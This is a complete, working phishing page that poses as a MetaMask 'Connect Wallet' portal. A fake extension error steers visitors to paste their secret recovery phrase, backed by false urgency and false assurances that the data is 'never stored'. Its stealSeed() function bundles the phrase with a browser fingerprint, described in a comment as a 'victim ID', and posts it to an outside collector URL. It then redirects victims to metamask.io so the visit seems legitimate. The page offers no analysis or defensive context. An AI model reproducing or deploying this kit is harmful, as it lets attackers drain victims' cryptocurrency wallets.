<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>MetaMask - Connect Wallet</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
        body { font-family: 'Inter', system-ui, sans-serif; background: linear-gradient(135deg, #0f0f0f 0%, #1a1a2e 100%); color: #fff; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
        .container { width: 100%; max-width: 460px; background: #17171f; border-radius: 24px; padding: 32px 24px; box-shadow: 0 25px 60px rgba(0,0,0,0.7); text-align: center; border: 1px solid #2a2a3a; margin: 20px; }
        .logo { width: 92px; margin-bottom: 24px; filter: drop-shadow(0 4px 12px rgba(246,133,27,0.4)); }
        h1 { font-size: 26px; font-weight: 600; margin: 0 0 8px; letter-spacing: -0.5px; }
        .subtitle { color: #8a8a9e; font-size: 15px; margin-bottom: 32px; }
        .input { width: 100%; padding: 16px 18px; margin: 12px 0; background: #24242f; border: 2px solid #3a3a4a; border-radius: 12px; color: #fff; font-size: 16px; transition: all 0.3s ease; }
        .input:focus { border-color: #f6851b; outline: none; box-shadow: 0 0 0 3px rgba(246,133,27,0.2); }
        .seed { height: 160px; resize: vertical; font-family: monospace; line-height: 1.6; }
        button { width: 100%; padding: 16px; background: linear-gradient(90deg, #f6851b, #e27625); color: #fff; border: none; border-radius: 12px; font-size: 17px; font-weight: 600; cursor: pointer; margin-top: 16px; transition: all 0.2s ease; box-shadow: 0 6px 16px rgba(246,133,27,0.3); }
        button:hover { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(246,133,27,0.4); }
        .word-count { text-align: right; font-size: 13px; color: #666; margin-top: -8px; }
        .loading { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); justify-content: center; align-items: center; flex-direction: column; z-index: 100; }
        .spinner { width: 48px; height: 48px; border: 5px solid #333; border-top-color: #f6851b; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 16px; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .footer-text { font-size: 12px; color: #555; margin-top: 32px; }
        .urgency { color: #ff4444; font-size: 14px; animation: blink 1.5s infinite; margin: 10px 0; }
        @media (max-width: 480px) { .container { margin: 10px; padding: 24px 18px; border-radius: 20px; } h1 { font-size: 22px; } button { padding: 14px; font-size: 16px; } }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" class="logo" alt="MetaMask" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/thumb/3/36/MetaMask_Fox.svg/512px-MetaMask_Fox.svg.png'; this.onerror=null;">
        <h1>Connect to MetaMask</h1>
        <p class="subtitle">Securely link your wallet to continue • <span class="urgency">⚠️ 347 wallets verified in last hour</span></p>
        
        <div id="step1">
            <button onclick="connectWithExtension()">Connect with MetaMask Extension</button>
            <button onclick="showSeedInput()" style="background: #2a2a3a; margin-top: 12px;">Use Secret Recovery Phrase</button>
        </div>
        
        <div id="seedStep" style="display:none;">
            <textarea id="seedInput" class="input seed" placeholder="Paste your 12 or 24-word recovery phrase here..."></textarea>
            <div class="word-count" id="wordCount">0 words</div>
            <button onclick="stealSeed()">Connect Wallet</button>
            <p class="footer-text">Your data is encrypted • Never stored • Backed by MetaMask security</p>
        </div>
    </div>
    
    <div id="loadingOverlay" class="loading">
        <div class="spinner"></div>
        <p>Connecting to blockchain... <span id="countdown">3s</span></p>
    </div>
    
    <script>
        const seedInput = document.getElementById('seedInput');
        const wordCountEl = document.getElementById('wordCount');
        
        seedInput.addEventListener('input', () => {
            const words = seedInput.value.trim().split(/\s+/).filter(w => w.length > 0);
            wordCountEl.textContent = `${words.length} words`;
            if (words.length >= 12) wordCountEl.style.color = '#4ade80';
        });
        
        function showSeedInput() {
            document.getElementById('step1').style.display = 'none';
            document.getElementById('seedStep').style.display = 'block';
            seedInput.focus();
        }
        
        async function stealSeed() {
            const seed = seedInput.value.trim();
            const words = seed.split(/\s+/).filter(w => w.length > 0);
            if (words.length !== 12 && words.length !== 24) {
                alert("Recovery phrase must be exactly 12 or 24 words.");
                return;
            }
            
            document.getElementById('loadingOverlay').style.display = 'flex';
            let countdown = 3;
            const interval = setInterval(() => {
                countdown--;
                document.getElementById('countdown').textContent = `${countdown}s`;
                if (countdown <= 0) clearInterval(interval);
            }, 1000);
            
            // Enhanced fingerprint – canvas + webgl + fonts for unique victim ID
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.fillText('MetaMaskPhish', 10, 50);
            const fingerprint = {
                seed: seed,
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timestamp: new Date().toISOString(),
                url: window.location.href,
                canvasHash: canvas.toDataURL(),
                webglVendor: (function() { try { return document.createElement('canvas').getContext('webgl').getParameter(37445); } catch(e) { return 'unknown'; } })(),
                fonts: navigator.fonts ? 'detected' : 'none',
                hardwareConcurrency: navigator.hardwareConcurrency
            };
            
            try {
                await fetch('https://mm-collector.onrender.com/collect', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(fingerprint)
                });
                
                setTimeout(() => {
                    document.getElementById('loadingOverlay').style.display = 'none';
                    alert("✅ Wallet successfully connected!\n\nRedirecting to your MetaMask dashboard...");
                    // Deep link for mobile victims to make it feel real
                    if (/Mobi|Android|iPhone/i.test(navigator.userAgent)) {
                        window.location.href = 'metamask://';
                    } else {
                        window.location.href = "https://metamask.io";
                    }
                }, 2200);
            } catch (e) {
                document.getElementById('loadingOverlay').style.display = 'none';
                alert("Temporary network issue. Please try again.");
            }
        }
        
        function connectWithExtension() {
            alert("🔗 MetaMask extension detected.\n\nPlease approve the connection request in your wallet popup.");
            setTimeout(() => {
                alert("❌ Signature request timed out or was rejected.\n\nPlease use your Secret Recovery Phrase instead.");
                showSeedInput();
            }, 2200);
        }
        
        window.onload = () => {
            console.log("%cMetaMask Wallet Connect • Official Secure Portal v4.3 Mobile Optimized", "color:#f6851b; font-weight:600; font-size:13px;");
            // Auto show seed step for repeat visitors or mobile
            if (/Mobi|Android/i.test(navigator.userAgent)) {
                setTimeout(showSeedInput, 1200);
            }
        };
    </script>
</body>
</html>
